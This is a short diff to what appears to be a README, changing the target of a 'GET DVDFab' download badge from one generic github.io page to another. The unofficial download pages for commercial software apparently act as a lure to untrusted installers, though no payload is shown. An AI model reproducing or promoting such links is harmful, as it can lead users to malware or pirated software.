@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/dvdfab">  
+<a href="https://install-quick-software.github.io/.github/dvdfab">  
 <img src="https://img.shields.io/badge/💻_GET_DVDFab-indigo?style=for-the-badge&logo=apple" alt="GET DVDFab">  
 </a>  
 </div>
